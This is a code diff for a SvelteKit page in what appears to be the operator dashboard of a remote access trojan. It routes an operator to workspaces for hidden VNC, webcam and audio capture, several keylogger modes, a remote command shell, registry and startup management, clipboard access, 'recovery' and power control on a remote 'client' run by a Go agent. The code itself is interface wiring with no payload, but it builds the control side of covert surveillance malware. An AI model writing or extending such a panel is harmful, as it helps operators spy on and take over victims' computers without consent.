@@ -1,108 +1,141 @@
 <script lang="ts">
-	import {
-		Card,
-		CardContent,
-		CardDescription,
-		CardHeader,
-		CardTitle
-	} from '$lib/components/ui/card/index.js';
-	import { Separator } from '$lib/components/ui/separator/index.js';
-	import { buildClientToolUrl, type ClientToolDefinition } from '$lib/data/client-tools';
-	import type { PageData } from './$types';
+        import {
+                Card,
+                CardContent,
+                CardDescription,
+                CardHeader,
+                CardTitle
+        } from '$lib/components/ui/card/index.js';
+        import { buildClientToolUrl, type ClientToolDefinition, type ClientToolId } from '$lib/data/client-tools';
+        import type { PageData } from './$types';
+        import HiddenVncWorkspace from '$lib/components/workspace/tools/hidden-vnc-workspace.svelte';
+        import WebcamControlWorkspace from '$lib/components/workspace/tools/webcam-control-workspace.svelte';
+        import AudioControlWorkspace from '$lib/components/workspace/tools/audio-control-workspace.svelte';
+        import KeyloggerWorkspace from '$lib/components/workspace/tools/keylogger-workspace.svelte';
+        import CmdWorkspace from '$lib/components/workspace/tools/cmd-workspace.svelte';
+        import FileManagerWorkspace from '$lib/components/workspace/tools/file-manager-workspace.svelte';
+        import TaskManagerWorkspace from '$lib/components/workspace/tools/task-manager-workspace.svelte';
+        import RegistryManagerWorkspace from '$lib/components/workspace/tools/registry-manager-workspace.svelte';
+        import StartupManagerWorkspace from '$lib/components/workspace/tools/startup-manager-workspace.svelte';
+        import ClipboardManagerWorkspace from '$lib/components/workspace/tools/clipboard-manager-workspace.svelte';
+        import TcpConnectionsWorkspace from '$lib/components/workspace/tools/tcp-connections-workspace.svelte';
+        import RecoveryWorkspace from '$lib/components/workspace/tools/recovery-workspace.svelte';
+        import OptionsWorkspace from '$lib/components/workspace/tools/options-workspace.svelte';
+        import OpenUrlWorkspace from '$lib/components/workspace/tools/open-url-workspace.svelte';
+        import MessageBoxWorkspace from '$lib/components/workspace/tools/message-box-workspace.svelte';
+        import ClientChatWorkspace from '$lib/components/workspace/tools/client-chat-workspace.svelte';
+        import ReportWindowWorkspace from '$lib/components/workspace/tools/report-window-workspace.svelte';
+        import IpGeolocationWorkspace from '$lib/components/workspace/tools/ip-geolocation-workspace.svelte';
+        import EnvironmentVariablesWorkspace from '$lib/components/workspace/tools/environment-variables-workspace.svelte';
+        import SimpleActionWorkspace from '$lib/components/workspace/tools/simple-action-workspace.svelte';
+        import type { SvelteComponent } from 'svelte';
 
-	let { data } = $props<{ data: PageData }>();
-	const client = $derived(data.client);
-	const tool = $derived(data.tool);
-	const tools = $derived((data.tools ?? []) as ClientToolDefinition[]);
-	const segments = $derived(data.segments);
-	const otherTools = $derived(tools.filter((item) => item.id !== tool.id));
+        let { data } = $props<{ data: PageData }>();
+        const client = $derived(data.client);
+        const agent = $derived(data.agent);
+        const tool = $derived(data.tool);
+        const tools = $derived((data.tools ?? []) as ClientToolDefinition[]);
+        const segments = $derived(data.segments);
+        const otherTools = $derived(tools.filter((item) => item.id !== tool.id));
+
+        const componentMap = {
+                'hidden-vnc': HiddenVncWorkspace,
+                'webcam-control': WebcamControlWorkspace,
+                'audio-control': AudioControlWorkspace,
+                'file-manager': FileManagerWorkspace,
+                'task-manager': TaskManagerWorkspace,
+                'registry-manager': RegistryManagerWorkspace,
+                'startup-manager': StartupManagerWorkspace,
+                'clipboard-manager': ClipboardManagerWorkspace,
+                'tcp-connections': TcpConnectionsWorkspace,
+                recovery: RecoveryWorkspace,
+                options: OptionsWorkspace,
+                'open-url': OpenUrlWorkspace,
+                'message-box': MessageBoxWorkspace,
+                'client-chat': ClientChatWorkspace,
+                'report-window': ReportWindowWorkspace,
+                'ip-geolocation': IpGeolocationWorkspace,
+                'environment-variables': EnvironmentVariablesWorkspace
+        } as const;
+
+        const keyloggerModes = {
+                'keylogger-online': 'online',
+                'keylogger-offline': 'offline',
+                'keylogger-advanced-online': 'advanced-online'
+        } as const;
+
+        const simpleActionVariants: Partial<Record<ClientToolId, 'system-control' | 'power'>> = {
+                reconnect: 'system-control',
+                disconnect: 'system-control',
+                shutdown: 'power',
+                restart: 'power',
+                sleep: 'power',
+                logoff: 'power'
+        };
+
+        const activeComponent = $derived(componentMap[tool.id as keyof typeof componentMap]);
+        const keyloggerMode = $derived(keyloggerModes[tool.id as keyof typeof keyloggerModes]);
+        const simpleVariant = $derived(simpleActionVariants[tool.id as keyof typeof simpleActionVariants]);
 </script>
 
 <div class="space-y-6">
-	<Card>
-		<CardHeader>
-			<CardTitle>{tool.title}</CardTitle>
-			<CardDescription>{tool.description}</CardDescription>
-		</CardHeader>
-		<CardContent class="space-y-6 text-sm text-slate-600 dark:text-slate-400">
-			<section class="space-y-2">
-				<h2
-					class="text-xs font-semibold tracking-wide text-slate-500 uppercase dark:text-slate-400"
-				>
-					Client scope
-				</h2>
-				<p>
-					Workspace prepared for <span class="font-medium text-slate-900 dark:text-slate-100"
-						>{client.codename}</span
-					>
-					({client.hostname}). Use this area to design command flows and telemetry exchange with the
-					Go agent.
-				</p>
-			</section>
-			<Separator />
-			<section class="space-y-3">
-				<h2
-					class="text-xs font-semibold tracking-wide text-slate-500 uppercase dark:text-slate-400"
-				>
-					Next implementation steps
-				</h2>
-				<ul class="list-disc space-y-2 pl-5">
-					<li>
-						Model the request and response payloads shared with the client for <span
-							class="font-medium">{tool.title}</span
-						>.
-					</li>
-					<li>
-						Define validation, auditing, and permission guards within the server before dispatching
-						to the agent.
-					</li>
-					<li>
-						Map UI interactions to Go routines and shared contracts so future automation remains
-						consistent.
-					</li>
-				</ul>
-			</section>
-			<Separator />
-			<section class="space-y-2">
-				<h2
-					class="text-xs font-semibold tracking-wide text-slate-500 uppercase dark:text-slate-400"
-				>
-					Route blueprint
-				</h2>
-				<p>modules / {segments.join(' / ')}</p>
-			</section>
-		</CardContent>
-	</Card>
+        {#if keyloggerMode}
+                <KeyloggerWorkspace client={client} mode={keyloggerMode} />
+        {:else if simpleVariant}
+                <SimpleActionWorkspace client={client} toolId={tool.id} variant={simpleVariant} />
+        {:else if tool.id === 'cmd'}
+                <CmdWorkspace client={client} agent={agent} />
+        {:else if activeComponent}
+                {@const Workspace = activeComponent}
+                <Workspace client={client} />
+        {:else}
+                <Card>
+                        <CardHeader>
+                                <CardTitle>{tool.title}</CardTitle>
+                                <CardDescription>{tool.description}</CardDescription>
+                        </CardHeader>
+                        <CardContent class="space-y-4 text-sm text-slate-600 dark:text-slate-400">
+                                <p>
+                                        modules / {segments.join(' / ')} is currently using the default planning workspace. Define the
+                                        implementation contract here before wiring it to the Go agent.
+                                </p>
+                                <p>
+                                        Add a dedicated workspace component for <span class="font-medium">{tool.title}</span> to elevate the
+                                        operator experience when you are ready.
+                                </p>
+                        </CardContent>
+                </Card>
+        {/if}
 
-	{#if otherTools.length > 0}
-		<Card class="border-slate-200/80 dark:border-slate-800/80">
-			<CardHeader>
-				<CardTitle class="text-base">Explore other modules</CardTitle>
-				<CardDescription>
-					Jump into another workspace in a new tab to continue planning capabilities.
-				</CardDescription>
-			</CardHeader>
-			<CardContent>
-				<div class="grid gap-3 md:grid-cols-2">
-					{#each otherTools as item (item.id)}
-						<a
-							class="group flex flex-col rounded-lg border border-slate-200/70 bg-white/60 p-4 transition hover:border-sky-400 hover:shadow-sm dark:border-slate-800/70 dark:bg-slate-900/60 dark:hover:border-sky-500"
-							href={buildClientToolUrl(client.id, item)}
-							target={item.target === '_blank' ? '_blank' : undefined}
-							rel={item.target === '_blank' ? 'noopener noreferrer' : undefined}
-						>
-							<span
-								class="text-sm font-semibold text-slate-900 transition group-hover:text-sky-600 dark:text-slate-100 dark:group-hover:text-sky-400"
-							>
-								{item.title}
-							</span>
-							<span class="mt-1 line-clamp-2 text-xs text-slate-600 dark:text-slate-400">
-								{item.description}
-							</span>
-						</a>
-					{/each}
-				</div>
-			</CardContent>
-		</Card>
-	{/if}
+        {#if otherTools.length > 0}
+                <Card class="border-slate-200/80 dark:border-slate-800/80">
+                        <CardHeader>
+                                <CardTitle class="text-base">Explore other modules</CardTitle>
+                                <CardDescription>
+                                        Jump into another workspace in a new tab to continue planning capabilities.
+                                </CardDescription>
+                        </CardHeader>
+                        <CardContent>
+                                <div class="grid gap-3 md:grid-cols-2">
+                                        {#each otherTools as item (item.id)}
+                                                <a
+                                                        class="group flex flex-col rounded-lg border border-slate-200/70 bg-white/60 p-4 transition hover:border-sky-400 hover:shadow-sm dark:border-slate-800/70 dark:bg-slate-900/60 dark:hover:border-sky-500"
+                                                        href={buildClientToolUrl(client.id, item)}
+                                                        target={item.target === '_blank' ? '_blank' : undefined}
+                                                        rel={item.target === '_blank' ? 'noopener noreferrer' : undefined}
+                                                >
+                                                        <span
+                                                                class="text-sm font-semibold text-slate-900 transition group-hover:text-sky-600 dark:text-slate-100 dark:group-hover:text-sky-400"
+                                                        >
+                                                                {item.title}
+                                                        </span>
+                                                        <span class="mt-1 line-clamp-2 text-xs text-slate-600 dark:text-slate-400">
+                                                                {item.description}
+                                                        </span>
+                                                </a>
+                                        {/each}
+                                </div>
+                        </CardContent>
+                </Card>
+        {/if}
 </div>
